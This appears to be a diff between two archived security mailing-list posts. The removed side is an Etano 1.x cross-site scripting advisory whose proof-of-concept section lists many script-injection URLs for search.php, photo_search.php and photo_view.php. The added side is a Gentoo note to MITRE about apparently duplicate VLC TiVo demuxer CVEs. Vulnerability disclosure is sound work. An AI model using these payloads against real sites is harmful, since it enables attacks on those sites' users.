@@ -1,125 +1,42 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/03/05/15
-Message-ID: <CAPYM6VzMjVmu4HJ6SSrHAbuYu0gKvvjtY=+dQHytHvF3AcQSGA@mail.gmail.com>
-Date: Tue, 6 Mar 2012 00:55:03 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
-To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
-Subject: Etano 1.x <= Multiple Cross Site Scripting Vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/10/29/5
+Message-ID: <508ECA88.7040902@gentoo.org>
+Date: Mon, 29 Oct 2012 14:27:20 -0400
+From: Sean Amoss <ackle@...too.org>
+To: cve@...re.org, "Steven M. Christey" <coley@...us.mitre.org>
+CC: oss-security@...ts.openwall.com,  Gentoo Linux Security Team <security@...too.org>, xtophe@...eolan.org
+Subject: VideoLAN TiVo Demuxer Duplicate CVEs (CVE-2011-5231 and CVE-2012-0023)
 Content-Type: text/plain; charset=utf-8
 
-1. OVERVIEW
+Steve, MITRE, vendors:
 
-Etano 1.x versions are vulnerable to Cross Site Scripting.
+It appears that there may be two CVE's for the same issue:
 
+CVE-2011-5231 - Double free vulnerability in the get_chunk_header
+function in modules/demux/ty.c in VideoLAN VLC media player 0.9.0
+through 1.1.12 allows remote attackers to cause a denial of service
+(crash) and possibly execute arbitrary code via a crafted TiVo (TY) file.
 
-2. BACKGROUND
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5231
 
-The community builder script we provide - Etano - was built entirely
-based on requests from customers of our previous dating package
-(Dating Site Builder). Almost every feature ever requested was built
-into Etano to help you build a better site for your community members.
-You can use Etano to start up a dating site, a social networking site,
-a classifieds site or any other type of site involving groups of
-people, companies, products.
+References to http://www.videolan.org/security/sa1108.html
 
+=======================================================================
 
-3. VULNERABILITY DESCRIPTION
+CVE-2012-0023 - Buffer overflow in VLC TiVo demuxer
 
-Multiple parameters were not properly sanitized upon submission to
-join.php, search.php, photo_search.php and photo_view.php , which
-allows attacker to conduct Cross Site Scripting attack. This may allow
-an attacker to create a specially crafted URL that would execute
-arbitrary script code in a victim's browser.
+CVE Assignment: http://www.openwall.com/lists/oss-security/2012/01/03/12
+
+References http://www.videolan.org/security/sa1108.html in assignment above
 
 
-4. VERSIONS AFFECTED
-
-Tested in 1.x versions (1.20-1.22)
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-URL: http://localhost/etano/join.php
-Method: POST
-Vulnerable Parameters: user, email, email2, f17_zip, agree
-
-------------------------------------------------------------------------------------------------
-
-URL: http://localhost/etano/search.php
-Method: GET
-Vulnerable Parameters: QUERY STRING, st, f17_city,f17_country ,
-f17_state, f17_zip, f19, wphoto, search, v, return
+Thanks,
+Sean
+-- 
+Sean Amoss
+Gentoo Security | GLSA Coordinator
+E-Mail	  : ackle@...too.org
+GnuPG FP  : E58A AABD DD2D 03AF 0A7A 2F14 1877 72EC E928 357A
 
 
-http://localhost/etano/search.php?'"><script>alert(/XSS/)</script>
-
-http://localhost/etano/search.php?st='"><script>alert(/XSS/)</script>
-
-http://localhost/etano/search.php?f17_city='"><script>alert(/XSS/)</script>&f17_country=0&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto=1
-
-http://localhost/etano/search.php?f17_city=0&f17_country='"><script>alert(/XSS/)</script>&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto=1
-
-http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state='"><script>alert(/XSS/)</script>&f17_zip=3&f19=0&st=basic&wphoto=1
-
-http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip='"><script>alert(/XSS/)</script>&f19=0&st=basic&wphoto=1
-
-http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19='"><script>alert(/XSS/)</script>&st=basic&wphoto=1
-
-http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19=0&st='"><script>alert(/XSS/)</script>&wphoto=1
-
-http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto='"><script>alert(/XSS/)</script>
-
-http://localhost/etano/search.php?search='"><script>alert(/XSS/)</script>&v=g
-
-http://localhost/etano/search.php?search=51d43831f5dde83a4eedb23895f165f6&v='"><script>alert(/XSS/)</script>
-
-http://localhost/etano/search.php?st=xss"><script>alert(/XSS/)</script>&user=unknown
-
-------------------------------------------------------------------------------------------------
-
-URL: http://localhost/etano/photo_search.php
-Method: GET
-Vulnerable Parameters: QUERY STRING, st, return
-
-http://localhost/etano/photo_search.php?'"><script>alert(/XSS/)</script>
-
-http://localhost/etano/photo_search.php?st='"><script>alert(/XSS/)</script>
-
-------------------------------------------------------------------------------------------------
-
-URL: http://localhost/etano/photo_view.php
-Method: GET
-Vulnerable Parameter: return
-
-http://localhost/etano/photo_view.php?photo_id=1&return="><script>alert(/XSS/)</script>
-
-
-6. SOLUTION
-
-The vendor hasn't released the fixed yet.
-
-
-7. VENDOR
-
-Datemill
-http://www.datemill.com/
-
-
-8. CREDIT
-
-Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
-
-
-9. DISCLOSURE TIME-LINE
-
-2011-06-21: notified vendor
-2012-03-05: vulnerability disclosed
-
-
-10. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/%5Betano_1.2.x%5D_xss
-
-
-#yehg [2012-03-05]
+Download attachment "signature.asc" of type "application/pgp-signature" (295 bytes)
